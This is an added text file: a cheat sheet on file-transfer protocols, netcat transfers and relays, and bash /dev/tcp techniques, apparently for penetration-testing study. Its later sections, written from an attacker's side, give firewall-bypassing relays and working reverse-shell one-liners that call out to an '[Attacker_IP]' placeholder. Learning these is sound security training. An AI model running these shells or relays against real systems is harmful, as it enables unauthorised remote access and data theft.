@@ -1,0 +1,238 @@
+===============================================================================
+FILE TRANSFER & RECON REFERENCE SHEET
+STANDARD NETWORK PROTOCOL REGISTRY
+===============================================================================
+Every standard network transfer protocol follows specific structural properties:
+
+PROTOCOL  PORT       TRANSPORT  SECURITY/ENCRYPTION  RFC / SPECIFICATION
+TFTP      69         UDP        None (Cleartext)     RFC 1350 Rev2
+FTP       21 / 20    TCP        None (Cleartext)     RFC 959 (Last Rev 1985)
+FTPS      21 / 990   TCP        SSL / TLS            RFC 2228 / RFC 4217
+SFTP      22         TCP        SSH v2.0             RFC 4251/4253/4254
+SCP       22         TCP        SSH                  Symmetric/Asymmetric
+
+-------------------------------------------------------------------------------
+PROTOCOL CHARACTERISTICS & DEPLOYMENT USE CASES
+-------------------------------------------------------------------------------
+
+Use this matrix to identify operational parameters and restrictions:
+
+PROTOCOL  INTERACTIVE?  DIR SERVICES?  COMMON DEPLOYMENT / USE CASE
+TFTP      No            No             Booting disk-less nodes in LANs (e.g. BOOTP)
+FTP       Yes           Yes            Legacy applications, Client-Server uploads
+FTPS      Yes           Yes            Secure business file exchange over TLS
+SFTP      Yes           Yes            Resuming interrupted transfers, managing files
+SCP       No            No             Fast, non-interactive secure admin copy tasks
+
+-------------------------------------------------------------------------------
+FTP CORE OPERATIONAL COMMAND DICTIONARY
+-------------------------------------------------------------------------------
+
+Use these terminal controls when interacting via standard FTP console applications:
+
+USER CMD      SYSTEM CMD  ACTION
+ls            LIST        Lists contents of current directory on remote server
+pwd           PWD         Prints current working directory on remote server
+cd            CWD         Changes current working directory on remote server
+get           RETR        Retrieves a file from remote server and stores it locally
+put           STOR        Stores a local file onto the remote server
+passive       PASV        Switches server into passive mode for data transfer
+delete        DELE        Deletes a file on the remote FTP server
+mkdir         MKD         Creates a new directory on the remote FTP server
+quit / exit   QUIT        Terminates the FTP session and exits
+-------------------------------------------------------------------------------
+FTP CHANNEL MODES: ACTIVE VS. PASSIVE TRADEOFFS
+-------------------------------------------------------------------------------
+Active FTP (Client Ephemeral -> Server 21 Control Channel)
+
+Formula: Client listens on (Ephemeral High Port + 1) and sends "PORT N+1" command.
+
+Execution: Server initiates data channel back (Server 20 -> Client Ephemeral+1).
+
+Example: Client 1026 sends PORT 1027, server connects from 20 to client 1027.
+
+Firewall/NAT Impact: High failure rate if client firewall/NAT blocks incoming server requests.
+
+Passive FTP (Client Ephemeral -> Server 21 Control Channel)
+
+Formula: Client issues "PASV" command over control channel.
+
+Execution: Server opens a random high port and responds with connection criteria.
+
+Data Channel: Client initiates data channel back (Client Ephemeral+2 -> Server Random High).
+
+Firewall/NAT Impact: Client friendly, but leaves a broad block of high ports open on the server.
+-------------------------------------------------------------------------------
+FTPS ENCRYPTION SCHEMES (EXPLICIT VS. IMPLICIT)
+-------------------------------------------------------------------------------
+Explicit FTPS:
+
+Initial connection starts in cleartext on standard control port 21.
+
+Client issues an explicit command (e.g., AUTH) requesting a secure upgrade.
+
+Renegotiates control channel over TLS/SSL; data channels upgraded dynamically.
+-------------------------------------------------------------------------------
+Implicit FTPS:
+
+Session is entirely encrypted from inception.
+
+Dedicated baseline assignments use TCP Port 990 for control and TCP Port 989 for data channel.
+
+Client must complete a TLS/SSL handshake immediately upon connection or it fails.
+-------------------------------------------------------------------------------
+SFTP VS. FTP OVER SSH TUNNEL WARNING
+-------------------------------------------------------------------------------
+SFTP: A standalone extension of SSH v2.0 natively processing all transfers safely via Port 22.
+
+FTP over SSH: NOT a secure protocol alternative. This configuration tunnels a normal cleartext FTP session across an SSH channel. ONLY the control channel (Port 21) becomes encrypted. The actual data channel spawned by the server remains completely in plaintext.
+-------------------------------------------------------------------------------
+SCP FLAGS AND SYNTAX EXPRESSION REGISTRY
+-------------------------------------------------------------------------------
+Syntax Formula: scp [Switches] [Source_Path] [Destination_Path]
+
+[ OPERATIONAL SWITCH REGISTRY ]
+SWITCH  FUNCTIONAL OVERVIEW
+-v      Verbose mode; outputs operational flow and debugging lines
+-p      Preserves timestamps and drops estimated connection speeds/metrics
+-P      Specifies alternate remote host port connection (MUST be capital 'P')
+-C      Enables stream compression to accelerate runtime transfers
+-l      Limits pipeline bandwidth (Calculated in bits; e.g., 100KB/s = parameter 800)
+-r      Recursively targets and transfers an entire local/remote directory tree
+-3      Routes transfers between two remote targets directly through local host
+-------------------------------------------------------------------------------
+[ ARCHITECTURAL DIRECTION FORMULAS ]
+-------------------------------------------------------------------------------
+Remote Source to Local Target:
+scp user@remote:/path/to/source.dat /local/path/
+
+Local Source to Remote Target:
+scp /local/path/source.dat user@remote:/remote/path/
+
+Intermediary 3rd-Party Remote to Remote (Local Host proxying):
+scp -3 user1@remote1:/file.dat user2@remote2:/target/path/
+-------------------------------------------------------------------------------
+NETCAT (NC) SWISS ARMY SOCKET RUNTIME ENGINE
+-------------------------------------------------------------------------------
+Listener Mode (Server Socket): Binds to a local system port and waits for incoming hits.
+
+Client Mode (Client Socket): Actively targets and creates a link to a remote listener.
+-------------------------------------------------------------------------------
+[ CORE OPERATIONAL DICTIONARY ]
+FUNCTIONAL ACTION             SYNTAX IMPLEMENTATION
+Launch Verbose Listener       nc -l -v -p [Port Number]
+Connect Client to Endpoint    nc [Target_IP] [Port Number]
+-------------------------------------------------------------------------------
+[ DIRECTIONAL FILE TRANSFER MATRIX ]
+-------------------------------------------------------------------------------
+Target Listener (Receiving) <--- Attacker Client (Sending)
+
+Receiver Listener (First):   nc -lvp 9001 > destination_file.txt
+
+Sender Client (Second):      nc [Receiver_IP] 9001 < source_file.txt
+
+Target Listener (Sending)   ---> Attacker Client (Receiving)
+
+Sender Listener (First):     nc -lvp 9001 < source_file.txt
+
+Receiver Client (Second):    nc [Sender_IP] 9001 > destination_file.txt
+-------------------------------------------------------------------------------
+LINUX FILE DESCRIPTOR (FD) REGISTRY
+-------------------------------------------------------------------------------
+Every standard stream redirection maps to these exact integers:
+
+FD  STREAM SYMBOL  ABBREVIATION  DEFAULT HARDWARE CHANNEL
+0   Standard Input  stdin         Keyboard / Terminal Entry
+1   Standard Output stdout        Terminal Display Screen
+2   Standard Error  stderr        Terminal Screen (or dumped to /dev/null)
+-------------------------------------------------------------------------------
+BIDIRECTIONAL NETCAT RELAYS (NAMED PIPE SETUP)
+-------------------------------------------------------------------------------
+Standard unnamed pipes (|) cannot share data or handle bidirectional flows between unrelated system processes. To create middle-man pivots, build a Named Pipe (FIFO) file:
+
+Named Pipe Creation:   mkfifo mypipe   -OR-   mknod mypipe p
+-------------------------------------------------------------------------------
+[ RELAY TOPOLOGY BLUEPRINTS ]
+-------------------------------------------------------------------------------
+Listener-to-Listener Relay (Bypasses mutual inward blocks)
+
+Middle Relay Host:   nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+
+Source Host:         nc [Relay_IP] 1111 < cleartext.dat
+
+Destination Host:    nc [Relay_IP] 3333 > dropped.dat
+-------------------------------------------------------------------------------
+Client-to-Client Relay (Attacker masquerading as internal device)
+-------------------------------------------------------------------------------
+Middle Relay Host:   nc [Target_A_IP] 1111 < mypipe | nc [Target_B_IP] 3333 > mypipe
+
+Target A Listener:   nc -lvp 1111 < cleartext.dat
+
+Target B Listener:   nc -lvp 3333 > dropped.dat
+-------------------------------------------------------------------------------
+Client-to-Listener Relay (Bypasses network edge rules)
+-------------------------------------------------------------------------------
+Middle Relay Host:   nc [Target_A_IP] 1111 < mypipe | nc -lvp 3333 > mypipe
+
+Target A Listener:   nc -lvp 1111 < cleartext.dat
+
+Target B Listener:   nc [Relay_IP] 3333 > dropped.dat
+-------------------------------------------------------------------------------
+Listener-to-Client Relay (Bypasses alternative ingress rules)
+-------------------------------------------------------------------------------
+Middle Relay Host:   nc -lvp 1111 < mypipe | nc [Target_B_IP] 3333 > mypipe
+
+Target A Client:     nc [Relay_IP] 1111 < cleartext.dat
+
+Target B Listener:   nc -lvp 3333 > dropped.dat
+-------------------------------------------------------------------------------
+BASH LOW-LEVEL FILE TRANSFER ENGINE (/DEV/TCP & /DEV/UDP)
+-------------------------------------------------------------------------------
+Living Off The Land (LotL) socket technique utilizing internal shell resource allocations when binary file transfer utilities are completely stripped:
+
+Sending Files via Native /dev/tcp Pipelines:
+
+Target Endpoint (NC Listener): nc -lvp 1111 > dropped.dat
+
+Source LotL Shell (Sender):    cat payload.dat > /dev/tcp/[Target_IP]/1111
+
+Receiving Files via Native /dev/tcp Pipelines:
+
+Source Endpoint (NC Listener): nc -lvp 1111 < inventory.dat
+
+Target LotL Shell (Receiver):  cat < /dev/tcp/[Source_IP]/1111 > inventory.dat
+-------------------------------------------------------------------------------
+REMOTE SHELLS & EXTENDED REVERSE TERMINALS
+-------------------------------------------------------------------------------
+Core Definition: The target host initializes the raw network connection outward to an attacker-controlled listening socket to bypass firewall filters.
+-------------------------------------------------------------------------------
+[ NC BINARY BINDING RUNTIME SHELLS ]
+-------------------------------------------------------------------------------
+Target Switch -e: Executes and binds a binary tool directly over the socket stream channel.
+
+Attacker Listener (First):  nc -lvp 9999
+
+Linux Target Reverse:       nc -e /bin/bash [Attacker_IP] 9999
+
+Alternate Linux Execution:   nc -c /bin/bash [Attacker_IP] 9999
+-------------------------------------------------------------------------------
+[ INTERACTIVE BASH /DEV/TCP REVERSE SHELLS ]
+-------------------------------------------------------------------------------
+Fully interactive shell injection blueprint without deploying auxiliary packages:
+
+Attacker Listener (First):  nc -lvp 9999
+
+Target LotL Execution:      /bin/bash -i > /dev/tcp/[Attacker_IP]/9999 0<&1 2>&1
+-------------------------------------------------------------------------------
+[ DESCRIPTOR SYNTAX ANATOMY BREAKDOWN ]
+-------------------------------------------------------------------------------
+/bin/bash  = Points to the local native shell binary executable path.
+
+-i         = Flags execution to run an Interactive terminal shell instance.
+
+> /dev/tcp = Pipes stdout (1) directly into the outbound network socket connection.
+
+0<&1       = Duplicates file descriptor 1 to standard input (0), locking control inputs.
+
+2>&1       = Redirects all stderr (2) to stdout (1), passing errors out to the listener stream.
+===============================================================================
